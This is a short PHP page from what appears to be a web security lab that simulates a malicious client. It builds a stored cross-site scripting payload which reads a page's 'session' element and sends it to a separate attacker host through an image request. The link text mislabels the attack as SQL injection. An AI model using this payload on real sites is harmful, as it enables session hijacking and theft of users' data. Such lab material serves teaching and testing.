<?php
include('../declare.php');

$value = urlencode("<script>var d=document;var e=d.getElementById('session');var i=d.createElement('img');i.src='".MALROOT."images/attack.png?'+encodeURIComponent(e.textContent);e.appendChild(i);</script>");

$title = "Malicious client prototype: Stored XSS";
include('../inc/header.php');
?>
<h1>Stored XSS</h1>
<p class="instructions">
Click here to simulate a malicious client with an SQL injection request:
<a href="<?=TGTROOT?>stored/target?value=<?=$value?>">attack</a>
</p>
<?
$links = array(
  'stored XSS start' => TGTROOT."stored/start",
);
include('../inc/footer.php');
?>
